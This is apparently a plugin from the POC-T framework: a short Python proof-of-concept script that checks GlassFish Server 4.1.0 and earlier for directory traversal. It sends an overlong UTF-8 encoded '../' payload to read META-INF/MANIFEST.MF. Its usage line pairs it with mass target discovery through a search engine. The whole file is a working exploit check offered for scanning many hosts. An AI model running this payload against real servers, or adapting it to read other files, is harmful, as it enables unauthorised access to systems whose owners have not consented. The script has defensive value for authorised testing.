#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
GlassFish directory traversal vulnerability PoC

version <= 4.1.0

Usage:
  python POC-T.py -s glassfish-traversal -aZ "GlassFish Server Open Source Edition 4.1"

"""

import requests
from plugin.useragent import firefox
from plugin.urlparser import get_domain


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    url = get_domain(url)
    payload = '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
    try:
        c = requests.get(url + payload, headers={'User-Agent': firefox()}, timeout=10).content
    except Exception:
        return False
    if 'Version' in c:
        return True
    return False
